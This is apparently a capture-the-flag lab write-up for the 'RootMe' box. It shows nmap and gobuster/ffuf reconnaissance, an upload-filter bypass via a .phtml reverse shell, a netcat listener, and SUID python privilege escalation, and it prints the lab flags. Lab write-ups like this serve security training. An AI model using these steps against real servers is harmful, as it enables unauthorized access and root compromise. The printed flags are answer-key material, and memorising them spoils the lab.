# RootMe - Easy

<details>
<summary>nmap scan</summary>

```nmap -T4 -p- -A 10.10.147.4```

Nmap scan report for 10.10.147.4
Host is up (0.15s latency).
Not shown: 65510 closed tcp ports (conn-refused)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
ssh-hostkey:
    2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
    256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
    256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp    open     http    Apache httpd 2.4.29 ((Ubuntu))
http-title: HackIT - Home
http-cookie-flags:
    /:
     PHPSESSID
        httponly flag not set
http-server-header: Apache/2.4.29 (Ubuntu)
9627/tcp  filtered unknown
10671/tcp filtered unknown
10818/tcp filtered unknown
13611/tcp filtered unknown
13871/tcp filtered unknown
18354/tcp filtered unknown
28013/tcp filtered unknown
29888/tcp filtered unknown
31545/tcp filtered unknown
36664/tcp filtered unknown
36846/tcp filtered unknown
39259/tcp filtered unknown
39747/tcp filtered unknown
40463/tcp filtered unknown
40911/tcp filtered unknown
45536/tcp filtered unknown
48759/tcp filtered unknown
49494/tcp filtered unknown
50514/tcp filtered unknown
52768/tcp filtered unknown
53847/tcp filtered unknown
56545/tcp filtered unknown
63103/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

</details>

<br>

* Gobuster scan: ```gobuster dir -u http://10.10.147.4 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt```

* Alternatively, ffuf can be used: ```ffuf -u http://10.10.147.4/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt```

* This gives us the following directories:

```markdown
/uploads
/css
/js
/panel
```

* <http://10.10.147.4/panel> has a form, so we can try to upload a reverse shell

* The form does not accept .php files, so we can try other formats. The website accepts .phtml files, so upload the reverse shell and go to the /uploads directory and select uploaded file

* Setup a listener on required port: ```nc -nvlp 1234```

* We should get access to the system

* We need to find user.txt: ```find . -name user.txt 2>/dev/null```

* user.txt: ```THM{y0u_g0t_a_sh3ll}```

* Now we can search for files with SUID permissions set: ```find / -perm -u=s -type f 2>/dev/null```

* This gives us a lot of files, but the one that stands out is /usr/bin/python

* We can look for a SUID exploit on GTFObins for python

* Once we carry out the needful, we get root access

* root.txt: ```THM{pr1v1l3g3_3sc4l4t10n}```
